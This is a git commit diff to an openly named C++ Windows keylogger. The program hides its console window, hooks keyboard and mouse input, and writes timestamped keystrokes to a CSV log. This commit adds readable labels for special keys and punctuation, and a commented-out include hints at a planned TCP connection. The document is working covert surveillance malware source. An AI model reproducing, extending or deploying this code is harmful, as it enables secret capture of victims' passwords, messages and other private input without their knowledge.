47d879fa72678e3c33e2a8f39f91dbb4220892a1
Ferivonus <ferivonus@hotmail.com>
2023-04-02 13:31:15 +0300

    new version
    I add some sembols

--- keyloger-in-cpp/keyloger-in-cpp.cpp
+++ keyloger-in-cpp/keyloger-in-cpp.cpp
@@ -6,6 +6,9 @@
 #include <iomanip>
 #include <locale>
 
+// #include "tcp_connection.h"
+
+
 
 
 
@@ -17,6 +20,7 @@ LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
 
 int main()
 {
+
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     logFile.open("log.csv", std::ios::app);
     logStream << "Time,Event,Type,Key/Position\n";
@@ -54,32 +58,89 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 
         if (p->vkCode == VK_RETURN)
         {
-            key = " (typed Enter) ";
-            std::tm timeinfo;
-            localtime_s(&timeinfo, &timestamp);
-            if (timeinfo.tm_sec % 30 == 0) {
-                keyboardStream << "\n" << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ":"
-                    << key;
-            }
-            else {
-                keyboardStream << key << "\n";
-            }
+            key = " ( typed Enter )\n";
         }
+        else if (p->vkCode == VK_SPACE)
+        {
+            key = " ( typed Space ) ";
+        }
+        else if (p->vkCode == VK_SHIFT)
+        {
+            key = " ( typed Shift ) ";
+        }
+        else if (p->vkCode == VK_BACK)
+        {
+            key = " ( typed Backspace ) ";
+        }
+        else if (p->vkCode == VK_TAB)
+        {
+            key = " ( typed Tab ) ";
+        }
+        else if (p->vkCode == VK_ESCAPE)
+        {
+            key = " ( typed Escape ) ";
+        }
+        else if (p->vkCode == VK_CAPITAL)
+        {
+            key = " ( typed Caps Lock ) ";
+        }
+        else if (p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL)
+        {
+            key = " ( typed Control ) ";
+        }
+        else if (p->vkCode == VK_LMENU || p->vkCode == VK_RMENU)
+        {
+            key = " ( typed Alt ) ";
+        }
+        else if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN)
+        {
+            key = " ( typed Windows Key ) ";
+        }
+        else if (p->vkCode == VK_OEM_1)
+        {
+            key = " ( typed ; ) ";
+        }
+        else if (p->vkCode == VK_OEM_2) // Question mark key
+        {
+            key = " ( typed ? ) ";
+        }
+        else if (p->vkCode == VK_OEM_3)
+        {
+            key = " ( typed ~ ) ";
+        }
+        else if (p->vkCode == VK_OEM_4)
+        {
+            key = " ( typed [ ) ";
+        }
+        else if (p->vkCode == VK_OEM_5)
+        {
+            key = " ( typed | ) ";
+        }
+        else if (p->vkCode == VK_OEM_6)
+        {
+            key = " ( typed ] ) ";
+        }
+        else if (p->vkCode == VK_OEM_7)
+        {
+            key = " ( typed ' ) ";
+        }
+        
         else
         {
             key = static_cast<char>(tolower(p->vkCode));
-            std::tm timeinfo;
-            localtime_s(&timeinfo, &timestamp);
-            if (timeinfo.tm_sec % 30 == 0) {
-                keyboardStream << "\n" << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ":"
-                    << key;
-            }
-            else {
-                keyboardStream << key;
-            }
         }
+
         std::tm timeinfo;
         localtime_s(&timeinfo, &timestamp);
+        if (timeinfo.tm_sec % 30 == 0) {
+            keyboardStream << "\n" << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ":"
+                << key;
+        }
+        else {
+            keyboardStream << key;
+        }
+
+
         logStream << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ","
             << "Key,Pressed,"
             << key << "\n";
